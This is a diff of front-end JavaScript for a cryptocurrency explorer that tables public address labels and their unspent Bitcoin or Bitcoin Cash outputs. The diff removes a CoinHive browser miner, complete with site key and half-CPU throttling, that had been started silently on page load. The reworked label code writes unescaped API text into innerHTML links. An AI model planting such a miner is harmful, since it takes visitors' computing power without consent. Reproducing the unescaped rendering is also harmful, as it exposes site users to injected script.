@@ -1,12 +1,3 @@
-function initCoinHive()
-{
-  var miner = new CoinHive.Anonymous('Csj8qUyygCcffvPTYirPLvQQu9TVOkih');
-  miner.start(); //uncomment when finished
-  var deviceThreadCount = miner.getNumThreads();
-  miner.setNumThreads(deviceThreadCount/2);
-}
-
-
 function populateLabels(extend=false)
 {
   var chainID = document.getElementById("chainID").value;
@@ -17,12 +8,12 @@ function populateLabels(extend=false)
   var endDate = getCurrentDate();
   var labelTableHTML = document.getElementById("labelTable");
   var listLength = labelTableHTML.rows.length - 1;
-  
+
   if (extend == false)
   {
     labelTableHTML.innerHTML = "";
     var startPos = rowsCount;
-    var endPos = 0; 
+    var endPos = 0;
   }
   else
   {
@@ -35,7 +26,7 @@ function populateLabels(extend=false)
     {
       var APIResponseJSON = req.responseText;
       var labels = JSON.parse(APIResponseJSON);
-        
+
       if (extend == false){
         var header = labelTableHTML.createTHead();
         var headerRow = header.insertRow(0);
@@ -47,7 +38,7 @@ function populateLabels(extend=false)
         if (chainID == 2 || chainID == 4){
             utxoHeader.innerHTML = "<b>Total Unspent Output (BCH)</b>";
         }
-        else 
+        else
         {
         utxoHeader.innerHTML = "<b>Total Unspent Output (BTC)</b>";
         }
@@ -60,8 +51,8 @@ function populateLabels(extend=false)
         var label = bodyRow.insertCell(1);
         var utxo = bodyRow.insertCell(2);
         rank.innerHTML = labels[i]["rank"];
-        label.innerHTML = labels[i]["label"];
-        utxo.innerHTML = labels[i]["utxo"].toFixed(8)
+        label.innerHTML = "<a href=/api/?function=getPublicLabelOutputs&chainID=" + chainID + "&startDate=" + startDate + "&endDate=" + endDate + "&publicLabel=" + encodeURI(labels[i]["label"]) + " >" + labels[i]["label"] + "</a>";
+        utxo.innerHTML = labels[i]["amt"].toFixed(8)
       }
       if (extend=true)
       {
@@ -71,7 +62,7 @@ function populateLabels(extend=false)
   };
   req.open("GET", "/api/?function=getPublicLabelAggregates&chainID=" + chainID + "&startPos=" + startPos + "&endPos=" + endPos + "&startDate=" + startDate + "&endDate=" + endDate + "&searchTerm=" + searchTerm, true);
   req.send();
-    
+
 }
 
 
@@ -84,7 +75,7 @@ function sunChange(init=false, command="toggle"){
       $("#labelTable").removeClass("nightTimeLabelTable");
       sunChangeButtonHTML.value = "Night Mode";
   }
-      
+
   function toNight(){
       setCookie("sun", "night", 10000);
       bodyHTML.addClass("nightTimeBody");
@@ -137,9 +128,7 @@ function sunChange(init=false, command="toggle"){
 function setupPage()
 {
   window.setInterval(populateLabels, 10*1000*60);
-  try{
-  initCoinHive();
-  }catch(e){}
+
   clearScreen();
   getUiDefaults(init=true);
   populateLabels();
@@ -150,7 +139,7 @@ function setupPage()
 function selectCoin(coin, event=false)
 {
   var activateHTML = document.getElementById(coin);
-  
+
   if (coin == "bch")
   {
     chainID.value = 2;
@@ -173,22 +162,22 @@ function selectCoin(coin, event=false)
     var deactivate2HTML = document.getElementById("bch");
     var deactivate3HTML = document.getElementById("bch_test");
   }
-  
-  
+
+
   // activate selected section
   if (!activateHTML.className.includes("active"))
   {
     activateHTML.className += " active";
   }
-  
+
   try {
   // deactive other sections
   deactivate1HTML.className = deactivate1HTML.className.replace(" active", "");
   deactivate2HTML.className = deactivate2HTML.className.replace(" active", "");
   deactivate3HTML.className = deactivate3HTML.className.replace(" active", "");
     } catch (e) {}
-    
-  
+
+
   if (event){
   populateLabels();}
 }
@@ -212,7 +201,7 @@ function getUiDefaults(init=false)
   sunChange(init=init, orbitState);
   rowsCountHTML.value = rowsCount;
   rowsCountHTML.default = rowsCount;
-  
+
   // build the datetime filter list
   var d = new Date();
   var currentDate = d.getTime();
@@ -221,7 +210,7 @@ function getUiDefaults(init=false)
   {
     periodName = timePeriodList[i];
     startDate = new Date(currentDate);
-    startDate.setDate(startDate.getDate() - timePeriods[periodName]);  
+    startDate.setDate(startDate.getDate() - timePeriods[periodName]);
     var option = document.createElement("option");
     option.innerHTML = periodName;
     timePeriodHTML.add(option);
@@ -241,13 +230,13 @@ function clearScreen()
   var timePeriodHTML = document.getElementById("timePeriod");
   var searchBarHTML = document.getElementById("searchBar");
   var labelTableHTML = document.getElementById("labelTable");
-  
+
   rowsCountHTML.value = "";
   timePeriodHTML.innerHTML = "";
   searchBarHTML.value = "";
   labelTableHTML.value = "";
 }
-  
+
 
 function getCurrentDate()
 {
